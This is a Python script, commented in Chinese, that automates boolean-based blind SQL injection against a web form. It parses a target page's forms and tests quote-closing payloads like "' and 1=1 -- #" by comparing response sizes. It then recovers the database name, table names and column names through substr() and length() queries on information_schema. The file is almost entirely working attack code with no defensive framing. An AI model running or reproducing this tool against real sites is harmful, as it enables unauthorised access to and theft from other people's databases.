import requests
from bs4 import BeautifulSoup
from urllib.parse import parse_qs
from colorama import init, Fore

init(autoreset=True)  # 初始化colorama，设置autoreset=True以便在每次打印后自动重置颜色
from urllib.parse import urlparse, parse_qs


def get_form_value_ofbool(url):
    # 发送get请求获取html文档
    response = requests.get(url)
    if response.status_code == 200:
        #print(response.text)
        # 使用BeautifulSoup解析html文档
        soup = BeautifulSoup(response.text, 'html.parser')
        # 获取所有的form标签
        forms = soup.find_all('form')

        # 初始化用于保存数据的字典
        form_info = {}
        select_name = ''
        # 遍历所有的form标签
        for index, form in enumerate(forms):
            # 获取form标签的method属性
            method = form['method']
            # 获取form标签的所有select标签
            selects = form.find_all('select')
            # 获取form标签的所有input标签
            inputs = form.find_all('input')
            # 初始化用于保存 input 数据的列表
            input_info = []
            # 遍历所有的select标签
            for form_select in selects:
                # 获取select标签的name属性
                select_name = form_select.get('name', '')

            # 遍历所有的input标签
            for form_input in inputs:
                # 获取input标签的type属性
                input_type = form_input.get('type', '')
                # 获取input标签的name属性
                input_name = form_input.get('name', '')
                # 获取input标签的value属性
                input_value = form_input.get('value', '')
                # 将input的属性值进行保存
                input_data = {
                    'select': select_name,
                    'type': input_type,
                    'name': input_name,
                    'value': input_value
                }
                # 将input的属性值保存到列表中
                input_info.append(input_data)
            # 将form的method和input信息保存到字典中
            form_data = {
                'method': method,
                'input_info': input_info
            }
            form_info[index] = form_data
        return form_info

#form_data = {method:post,input_info:[{type:text,name:name,value:查询},{},{}]}




# 二分法
def sql_injection_bool_binary(url, form_info, input_data, data):
    # 初始化长度范围
    lower_bound = 0
    upper_bound = 1000  # 假设数据库名称的最大长度不超过100

    while lower_bound + 1 < upper_bound:
        data_origin = data.copy()
        current_guess = (lower_bound + upper_bound) // 2  # 计算中间值
        print("current_guess:", current_guess)
        # 更新数据，构造包含当前猜测长度的payload
        data_origin[payload_name] = data_origin[payload_name].replace('and 1=1',
                                                                      f"and length(database())>{current_guess}")
        print("data:", data_origin)
        # 发起请求
        response = requests.get(url, params=data_origin)
        print("len:", len(response.text), "normal_size:", normal_size)
        # 根据响应长度与正常页面长度的比较来调整搜索范围
        if len(response.text) == normal_size:  # 假设当长度猜测正确时，响应长度不变
            lower_bound = current_guess  # 增加下限，因为长度肯定大于current_guess
        else:
            upper_bound = current_guess  # 减小上限，因为我们已经知道长度少于current_guess
        print("lower_bound:", lower_bound)
        print("upper_bound:", upper_bound)
        print("current_guess:", current_guess)

    # 循环结束后，lower_bound指向了第一个不满足条件的值，因此数据库长度为lower_bound - 1
    database_length = upper_bound
    print(Fore.LIGHTRED_EX + f"数据库长度是: {database_length}")
    return database_length










def sql_injection_bool(url, form_info):
    global payload_submit_value, payload_submit, payload_name, normal_size
    print(Fore.YELLOW + "开始检测布尔型注入漏洞...")

    input_data = input('请输入查询的数值:')

    for i in range(len(form_info[0]['input_info'])):
        if form_info[0]['input_info'][i]['type'] == 'submit':
            payload_submit = form_info[0]['input_info'][i]['name'] + '=' + form_info[0]['input_info'][i]['value']
            payload_submit = form_info[0]['input_info'][i]['name']
            payload_submit_value = form_info[0]['input_info'][i]['value']
            break
            # print(payload_submit)

    for i in range(len(form_info[0]['input_info'])):
        if form_info[0]['input_info'][i]['select'] != '':
            payload_name = form_info[0]['input_info'][i]['select']
            break
            # print(payload_name)


        elif form_info[0]['input_info'][i]['type'] == 'text':
            payload_name = form_info[0]['input_info'][i]['name']
            break
            # print(payload_name)



    if form_info[0]['method'] == 'post':
        payload_name_value = 1
    elif form_info[0]['method'] == 'get':
        # 找到第一个&符号的位置
        # 插入双引号
        bihe = ["", "') and 1=1 -- #", "' and 1=1 -- #", '" and 1=1 -- #', " and 1=1 -- #", " and '1'='1' -- #"]
        for biheyuju in bihe:
            data = {
                f'{payload_name}': f'{input_data + biheyuju}',
                f'{payload_submit}': f'{payload_submit_value}'
            }
            print("data:" + str(data))
            response = requests.get(url, params=data)
            if biheyuju == "":
                normal_size = len(response.text)
                print(Fore.GREEN + "正常大小:" + str(normal_size))

            else:
                select_size = len(response.text)
                print(Fore.GREEN + "注入大小:" + str(select_size))
                if select_size == normal_size:
                    print(Fore.GREEN + "存在布尔型注入漏洞")
                    print(Fore.GREEN + "注入语句:" + biheyuju)
                    data_origin1 = data.copy()
                    #二分法
                    database_length = sql_injection_bool_binary(url, form_info, input_data, data)
                    print(Fore.GREEN + "开始获取数据库名称----")
                    dabase_name = []
                    # 获取数据库名称

                    for i in range(database_length):
                        for j in range(97,123):
                            data_copy = data.copy()
                            data_copy[payload_name] = data_copy[payload_name].replace(f"and 1=1",
                                                                                      f"and substr(database(),{i+1},1)='{chr(j)}'")
                            print("data_copy:" + str(data_copy))
                            response = requests.get(url, params=data_copy)
                            if len(response.text) == normal_size:
                                print("response.text:", len(response.text))
                                print("normal_size:", normal_size)
                                dabase_name.append(chr(j))
                            else:
                                continue
                    print(Fore.LIGHTRED_EX + "数据库名称:" + str(dabase_name))

                    print(Fore.GREEN + "开始获取表名-----")
                    table_count = 0
                    table_length = 0
                    table_name = ""
                    table_names = []
                    for i in range(1,100):
                        data_copy = data.copy()
                        data_copy[payload_name] = data_copy[payload_name].replace(f"and 1=1",
                                                                                  f"and (select count(table_name) from information_schema.tables where table_schema=database())={i}")
                        print("data_copy:" + str(data_copy))
                        response = requests.get(url, params=data_copy)
                        if len(response.text) == normal_size:
                            print("response.text:", len(response.text))
                            print(Fore.LIGHTRED_EX + "表的个数为:", i)
                            table_count = i
                            break
                        else:
                            continue

                    for i in range(table_count):
                        table_name = ""
                        for j in range(1,20):
                            data_copy = data.copy()
                            data_copy[payload_name] = data_copy[payload_name].replace(f"and 1=1",
                                                                                      f"and length((select table_name from information_schema.tables where table_schema=database() limit {i},1))={j}")

                            print("data_copy:" + str(data_copy))
                            response = requests.get(url, params=data_copy)
                            if len(response.text) == normal_size:
                                print("response.text:", len(response.text))
                                print(Fore.LIGHTRED_EX + "表的长度为:", j)
                                table_length = j

                            else:
                                continue

                        for k in range(table_length):
                            for l in range(97,123):
                                data_copy = data.copy()
                                data_copy[payload_name] = data_copy[payload_name].replace(f"and 1=1",
                                                                                          f"and substr((select table_name from information_schema.tables where table_schema=database() limit {i},1),{k+1},1)='{chr(l)}'")
                                print("data_copy:" + str(data_copy))
                                response = requests.get(url, params=data_copy)
                                if len(response.text) == normal_size:
                                    print("response.text:", len(response.text))
                                    print(Fore.LIGHTRED_EX + "表的值为:", chr(l))
                                    table_name = table_name + chr(l)
                        table_names.append(table_name)

                    print(Fore.LIGHTRED_EX + "表名:" + str(table_names))
                    print(table_count)


                    column_count = 0
                    print(Fore.GREEN + "开始获取列名-----")
                    for j in table_names:

                        for k in range(1,20):
                            data_copy = data.copy()
                            data_copy[payload_name] = data_copy[payload_name].replace(f"and 1=1",
                                                                                      f"and (select count(column_name) from information_schema.columns where table_name='{j}' and table_schema=database())={k}")
                            print("data_copy:" + str(data_copy))
                            response = requests.get(url, params=data_copy)
                            if len(response.text) == normal_size:
                                print(Fore.LIGHTRED_EX + "列的个数为:", k)
                                column_count = k
                                break
                        column_length = 0
                        column_names = []
                        for i in range(column_count):
                            column_name = ""
                            for l in range(1,20):
                                data_copy = data.copy()
                                data_copy[payload_name] = data_copy[payload_name].replace(f"and 1=1",
                                                                                          f"and length((select column_name from information_schema.columns where table_name='{j}' and table_schema=database() limit {i},1))={l}")
                                print("data_copy:" + str(data_copy))
                                response= requests.get(url, params=data_copy)
                                if len(response.text) == normal_size:
                                    print(Fore.LIGHTRED_EX + "第{i}列的长度为:", l)
                                    column_length = l

                            for m in range(column_length):
                                for n in range(97,123):
                                    data_copy = data.copy()
                                    data_copy[payload_name] = data_copy[payload_name].replace(f"and 1=1",
                                                                                              f"and substr((select column_name from information_schema.columns where table_name='{j}' and table_schema=database() limit {i},1),{m+1},1)='{chr(n)}'")
                                    print("data_copy:" + str(data_copy))
                                    response = requests.get(url, params=data_copy)
                                    if len(response.text) == normal_size:
                                        #print(Fore.LIGHTRED_EX + f"第{i}列的值为:", chr(n))
                                        column_name = column_name + chr(n)
                            column_names.append(column_name)
                            print(Fore.LIGHTRED_EX + f"第{i}列名:" + str(column_names))




































































